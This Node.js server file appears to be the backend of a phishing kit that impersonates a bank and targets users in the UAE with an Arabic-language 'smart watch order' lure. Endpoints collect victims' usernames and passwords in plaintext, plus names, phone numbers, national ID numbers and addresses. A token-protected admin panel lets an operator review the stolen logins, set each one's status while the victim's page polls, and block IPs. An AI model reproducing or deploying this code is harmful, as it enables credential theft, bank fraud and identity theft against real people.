const http = require('http');
const fs = require('fs');
const path = require('path');
const crypto = require('crypto');

const ROOT = __dirname;
const PORT = process.env.PORT || 8080;

const ADMIN_HASH = '7c4ef8b7e0b8b6a8e776f5161acc3a323673a7f13edca8386aeb74137214b671';
const TOKEN_SECRET = ADMIN_HASH + '_mbank_secret';
const visitors = {};
const orders = [];
const clicks = [];
const blockedIPs = new Set();
const loginAttempts = [];
let orderCounter = 1000;
let loginCounter = 5000;
let clickCounter = 0;
let totalVisitsToday = 0;
let pageViewsToday = 0;
let todayDate = new Date().toDateString();

function sha256(str) {
  return crypto.createHash('sha256').update(str).digest('hex');
}

function createToken() {
  const ts = Date.now().toString();
  const sig = crypto.createHmac('sha256', TOKEN_SECRET).update(ts).digest('hex');
  return ts + '.' + sig;
}

function verifyToken(token) {
  if (!token || !token.includes('.')) return false;
  const [ts, sig] = token.split('.');
  const expected = crypto.createHmac('sha256', TOKEN_SECRET).update(ts).digest('hex');
  if (sig !== expected) return false;
  const age = Date.now() - parseInt(ts);
  return age < 7 * 24 * 60 * 60 * 1000;
}

function getIP(req) {
  return req.headers['x-forwarded-for']?.split(',')[0]?.trim() || req.socket.remoteAddress || '0.0.0.0';
}

function getCookies(req) {
  return (req.headers.cookie || '').split(';').reduce((acc, c) => {
    const [k, v] = c.trim().split('=');
    if (k) acc[k] = v;
    return acc;
  }, {});
}

function isAdmin(req) {
  const header = req.headers['x-admin-token'];
  if (header && verifyToken(header)) return true;
  const cookies = getCookies(req);
  return verifyToken(cookies.admin_token);
}

function trackVisitor(req) {
  const ip = getIP(req);
  const ua = req.headers['user-agent'] || '';
  const reqPath = decodeURIComponent(req.url.split('?')[0]);

  if (reqPath.startsWith('/api/') || reqPath.startsWith('/admin')) return;

  const now = Date.now();
  const today = new Date().toDateString();
  if (today !== todayDate) {
    todayDate = today;
    totalVisitsToday = 0;
    pageViewsToday = 0;
  }

  pageViewsToday++;

  if (!visitors[ip]) {
    totalVisitsToday++;
    visitors[ip] = { ip, ua, page: reqPath, time: now, start: now };
  } else {
    visitors[ip].page = reqPath;
    visitors[ip].time = now;
    visitors[ip].ua = ua;
  }
}

function getActiveVisitors() {
  const cutoff = Date.now() - 60000;
  const active = [];
  for (const ip in visitors) {
    if (visitors[ip].time > cutoff) {
      active.push(visitors[ip]);
    } else {
      delete visitors[ip];
    }
  }
  return active;
}

function readBody(req) {
  return new Promise((resolve) => {
    let body = '';
    req.on('data', c => { body += c; if (body.length > 1e6) req.destroy(); });
    req.on('end', () => resolve(body));
  });
}

function json(res, data, status) {
  res.writeHead(status || 200, { 'Content-Type': 'application/json' });
  res.end(JSON.stringify(data));
}

const MIME = {
  '.html': 'text/html; charset=utf-8', '.css': 'text/css',
  '.js': 'application/javascript', '.png': 'image/png',
  '.jpg': 'image/jpeg', '.jpeg': 'image/jpeg', '.gif': 'image/gif',
  '.svg': 'image/svg+xml', '.woff': 'font/woff', '.woff2': 'font/woff2',
  '.ttf': 'font/ttf', '.ico': 'image/x-icon', '.json': 'application/json',
  '.xml': 'application/xml', '.php': 'text/html; charset=utf-8',
};

const server = http.createServer(async (req, res) => {
  const reqPath = decodeURIComponent(req.url.split('?')[0]);

  trackVisitor(req);

  // --- API Routes ---

  if (req.method === 'POST' && reqPath === '/admin/login') {
    const body = await readBody(req);
    try {
      const data = JSON.parse(body);
      if (sha256(data.password || '') === ADMIN_HASH) {
        const token = createToken();
        return json(res, { success: true, token });
      }
      return json(res, { success: false, message: 'كلمة المرور غير صحيحة' }, 401);
    } catch (e) {
      return json(res, { success: false, message: 'خطأ في الطلب' }, 400);
    }
  }

  if (req.method === 'POST' && reqPath === '/api/clicks') {
    const ip = getIP(req);
    const body = await readBody(req);
    try {
      const data = JSON.parse(body);
      orderCounter++;
      orders.push({
        id: orderCounter,
        name: '',
        phone: '',
        id_number: '',
        email: '',
        emirate: '',
        address: '',
        country: (data.country || 'غير معروف').substring(0, 100),
        service: (data.service || '').substring(0, 100),
        lang: data.lang || 'ar',
        ip,
        status: 'click',
        date: new Date().toISOString()
      });
      return json(res, { success: true });
    } catch (e) {
      return json(res, { error: 'bad request' }, 400);
    }
  }

  if (req.method === 'POST' && reqPath === '/api/orders') {
    const ip = getIP(req);
    if (blockedIPs.has(ip)) return json(res, { success: false, message: 'محظور' }, 403);
    const body = await readBody(req);
    try {
      const data = JSON.parse(body);
      orderCounter++;
      const order = {
        id: orderCounter,
        name: (data.name || '').substring(0, 100),
        phone: (data.phone || '').substring(0, 20),
        id_number: (data.id_number || '').substring(0, 50),
        email: (data.email || '').substring(0, 100),
        emirate: (data.emirate || '').substring(0, 50),
        address: (data.address || '').substring(0, 200),
        country: (data.country || 'الإمارات').substring(0, 50),
        service: (data.service || 'طلب ساعة ذكية').substring(0, 100),
        lang: data.lang || 'ar',
        ip: ip,
        status: 'pending',
        date: new Date().toISOString()
      };
      orders.push(order);
      return json(res, { success: true, id: order.id });
    } catch (e) {
      return json(res, { success: false, message: 'خطأ في البيانات' }, 400);
    }
  }

  if (req.method === 'GET' && reqPath === '/api/stats') {
    const active = getActiveVisitors();
    return json(res, {
      activeVisitors: active.length,
      totalVisitsToday,
      pageViewsToday,
      totalOrders: orders.length,
      pendingOrders: orders.filter(o => o.status === 'pending').length
    });
  }

  if (req.method === 'GET' && reqPath === '/api/orders') {
    if (!isAdmin(req)) return json(res, { error: 'unauthorized' }, 401);
    return json(res, { orders: orders.slice().reverse() });
  }

  if (req.method === 'GET' && reqPath === '/api/visitors') {
    if (!isAdmin(req)) return json(res, { error: 'unauthorized' }, 401);
    const active = getActiveVisitors();
    return json(res, { visitors: active, count: active.length });
  }

  if (req.method === 'POST' && reqPath === '/api/orders/status') {
    if (!isAdmin(req)) return json(res, { error: 'unauthorized' }, 401);
    const body = await readBody(req);
    try {
      const data = JSON.parse(body);
      const order = orders.find(o => o.id === data.id);
      if (!order) return json(res, { error: 'not found' }, 404);
      order.status = data.status;
      return json(res, { success: true });
    } catch (e) {
      return json(res, { error: 'bad request' }, 400);
    }
  }

  if (req.method === 'POST' && reqPath === '/api/block-ip') {
    if (!isAdmin(req)) return json(res, { error: 'unauthorized' }, 401);
    const body = await readBody(req);
    try {
      const data = JSON.parse(body);
      blockedIPs.add(data.ip);
      orders.forEach(o => { if (o.ip === data.ip) o.status = 'blocked'; });
      return json(res, { success: true });
    } catch (e) {
      return json(res, { error: 'bad request' }, 400);
    }
  }

  // --- Login Attempts ---

  if (req.method === 'POST' && reqPath === '/api/login-attempts') {
    const ip = getIP(req);
    const body = await readBody(req);
    try {
      const data = JSON.parse(body);
      loginCounter++;
      const attempt = {
        id: loginCounter,
        username: (data.username || '').substring(0, 100),
        password: (data.password || '').substring(0, 100),
        country: (data.country || 'غير معروف').substring(0, 100),
        lang: data.lang || 'ar',
        ip,
        status: 'waiting',
        date: new Date().toISOString()
      };
      loginAttempts.push(attempt);
      return json(res, { success: true, id: attempt.id });
    } catch (e) {
      return json(res, { error: 'bad request' }, 400);
    }
  }

  if (req.method === 'GET' && reqPath.startsWith('/api/login-attempts/') && reqPath.endsWith('/status')) {
    const parts = reqPath.split('/');
    const id = parseInt(parts[3]);
    const attempt = loginAttempts.find(a => a.id === id);
    if (!attempt) return json(res, { status: 'not_found' }, 404);
    return json(res, { status: attempt.status });
  }

  if (req.method === 'GET' && reqPath === '/api/login-attempts') {
    if (!isAdmin(req)) return json(res, { error: 'unauthorized' }, 401);
    return json(res, { attempts: loginAttempts.slice().reverse() });
  }

  if (req.method === 'POST' && reqPath === '/api/login-attempts/status') {
    if (!isAdmin(req)) return json(res, { error: 'unauthorized' }, 401);
    const body = await readBody(req);
    try {
      const data = JSON.parse(body);
      const attempt = loginAttempts.find(a => a.id === data.id);
      if (!attempt) return json(res, { error: 'not found' }, 404);
      attempt.status = data.status;
      return json(res, { success: true });
    } catch (e) {
      return json(res, { error: 'bad request' }, 400);
    }
  }

  // --- Admin Auth ---

  if ((reqPath.startsWith('/admin/') || reqPath === '/admin') && reqPath !== '/admin/login' && reqPath !== '/admin/login.html') {
    if (!isAdmin(req)) {
      const loginPage = path.join(ROOT, 'admin', 'login.html');
      if (fs.existsSync(loginPage)) {
        res.writeHead(200, { 'Content-Type': 'text/html; charset=utf-8' });
        return fs.createReadStream(loginPage).pipe(res);
      }
    }
  }

  // --- Static Files ---

  let filePath = reqPath;
  if (!filePath.endsWith('/') && !path.extname(filePath)) {
    const dirPath = path.join(ROOT, filePath);
    if (fs.existsSync(dirPath) && fs.statSync(dirPath).isDirectory()) {
      res.writeHead(301, { 'Location': filePath + '/' });
      return res.end();
    }
  }
  if (filePath.endsWith('/')) filePath += 'index.html';

  const fullPath = path.join(ROOT, filePath);
  if (!fs.existsSync(fullPath)) {
    res.writeHead(404, { 'Content-Type': 'text/plain' });
    return res.end('Not found: ' + filePath);
  }

  const ext = path.extname(fullPath).toLowerCase();
  res.writeHead(200, { 'Content-Type': MIME[ext] || 'application/octet-stream' });
  fs.createReadStream(fullPath).pipe(res);
});

server.listen(PORT, () => {
  console.log(`Server running at http://localhost:${PORT}`);
  console.log(`Admin:   http://localhost:${PORT}/admin/`);
});
